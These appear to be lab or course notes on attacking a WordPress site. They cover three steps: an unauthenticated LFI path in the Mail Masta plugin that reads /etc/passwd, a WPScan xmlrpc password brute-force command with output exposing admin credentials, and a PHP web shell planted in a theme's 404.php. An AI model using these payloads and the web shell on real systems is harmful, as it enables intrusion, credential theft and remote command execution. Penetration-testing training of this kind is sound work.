## Exploiting a Vulnerable Plugin

### Leveraging WPScan Results

From the results of the WPScan we saw two vulnerable plugins:
- Mail Masta 1.0
- Google Review Slider

Mail Msata is vulnerable to SQLi and LFI, and the report also has URLs to PoCs that provide information on how to exploit them.

For example the LFI can be exploited in the following way based on the `exploit-db` report, which states that any unauthenticated user can read local files through the path:

`/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`.


## Attacking WordPress Users

### WordPress User Bruteforce

This can also be done by using WPScan. The report returned three users:
- admin
- roger
- david

WPScan uses two kinds of login brute force attacks:
- xmlrpc - uses WordPress API to make login attempts through `/xmlrpc.php` - faster.
- wp-login - attempt to brute force the normal login page

**xmlrpc**
```sh
wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com

[+] URL: http://blog.inlanefreight.com/                                                  
[+] Started: Thu Apr  9 13:37:36 2020                                                                                                                                               
[+] Performing password attack on Xmlrpc against 3 user/s

[SUCCESS] - admin / sunshine1
Trying david / Spring2016 Time: 00:00:01 <============> (474 / 474) 100.00% Time: 00:00:01

[i] Valid Combinations Found:
 | Username: admin, Password: sunshine1
```


## RCE via the Theme Editor

### Attacking the WordPress Backend

With admin access we can modify the PHP source code to execute system commands.

After logging in to the admin panel, and going on `Apperance` then `Theme Editor` we can edit the PHP source code directly.

We should select an inactive theme to avoid corrupting the main one, and then on a non-critical file such as `404.php` we can add a web shell.

```php
<?php

system($_GET['cmd']);

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
<SNIP>
```

